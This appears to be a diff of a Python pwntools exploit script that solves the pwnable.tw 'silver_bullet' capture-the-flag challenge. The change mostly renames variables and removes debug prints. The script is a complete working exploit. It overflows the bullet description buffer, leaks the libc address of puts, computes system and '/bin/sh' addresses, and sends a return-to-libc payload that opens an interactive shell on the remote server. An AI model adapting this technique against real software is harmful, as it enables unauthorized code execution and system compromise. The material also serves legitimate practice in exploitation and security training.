@@ -1,65 +1,62 @@
 from pwn import *
 
+server = remote('chall.pwnable.tw',10103)
 elf = ELF('./silver_bullet')
 libc = ELF('./libc_32.so.6')
-p = remote('chall.pwnable.tw',10103)
 
 # create bullet
-p.recvuntil('Your choice :')
-p.sendline('1')
-p.recvuntil('Give me your description of bullet :')
-p.sendline('a'*0x2f)
+server.recvuntil('Your choice :')
+server.sendline('1')
+server.recvuntil('Give me your description of bullet :')
+server.sendline('a'*0x2f)
 # power up
-p.recvuntil('Your choice :')
-p.sendline('2')
-p.recvuntil('Give me your another description of bullet :')
-p.sendline('b')
+server.recvuntil('Your choice :')
+server.sendline('2')
+server.recvuntil('Give me your another description of bullet :')
+server.sendline('b')
 
-payload = "\xff"*3+p32(0xdeadbeef)
+payload = '\xff'*3 + p32(0xdeadbeef)
 payload += p32(elf.plt['puts']) + p32(elf.symbols['main']) + p32(elf.got['puts'])
 payload = payload.ljust(0x2f, 'a')
 # power up
-p.recvuntil('Your choice :')
-p.sendline('2')
-p.recvuntil('Give me your another description of bullet :')
-p.sendline(payload)
+server.recvuntil('Your choice :')
+server.sendline('2')
+server.recvuntil('Give me your another description of bullet :')
+server.sendline(payload)
 # beat
-p.recvuntil('Your choice :')
-p.sendline('3')
+server.recvuntil('Your choice :')
+server.sendline('3')
 
-p.recvuntil('win !!\n')
+server.recvuntil('win !!\n')
 # put.plt
-puts_addr = u32(p.recv(4))
-print hex(puts_addr)
+puts_addr = u32(server.recv(4))
 # libc base
 libcbase_addr = puts_addr - libc.symbols['puts']
-print hex(libcbase_addr)
 # system
 system_addr = libc.symbols['system'] + libcbase_addr
-print hex(system_addr)
 # /bin/sh 
 binsh_addr = next(libc.search('/bin/sh')) + libcbase_addr
 
 # create bullet
-p.recvuntil('Your choice :')
-p.sendline('1')
-p.recvuntil('Give me your description of bullet :')
-p.sendline('a'*0x2f)
+server.recvuntil('Your choice :')
+server.sendline('1')
+server.recvuntil('Give me your description of bullet :')
+server.sendline('a'*0x2f)
 # power up
-p.recvuntil('Your choice :')
-p.sendline('2')
-p.recvuntil('Give me your another description of bullet :')
-p.sendline('b')
+server.recvuntil('Your choice :')
+server.sendline('2')
+server.recvuntil('Give me your another description of bullet :')
+server.sendline('b')
 
-payload1 = "\xff"*3 + p32(0xdeafbeef)
-payload1 += p32(system_addr) + p32(elf.symbols['main']) + p32(binsh_addr)
-payload1 = payload1.ljust(0x2f, 'a')
+payload = '\xff'*3 + p32(0xdeafbeef)
+payload += p32(system_addr) + p32(elf.symbols['main']) + p32(binsh_addr)
+payload = payload.ljust(0x2f, 'a')
 # power up
-p.recvuntil('Your choice :')
-p.sendline('2')
-p.recvuntil('Give me your another description of bullet :')
-p.sendline(payload1)
+server.recvuntil('Your choice :')
+server.sendline('2')
+server.recvuntil('Give me your another description of bullet :')
+server.sendline(payload)
 # beat
-p.recvuntil('Your choice :')
-p.sendline('3')
-p.interactive()
+server.recvuntil('Your choice :')
+server.sendline('3')
+server.interactive()
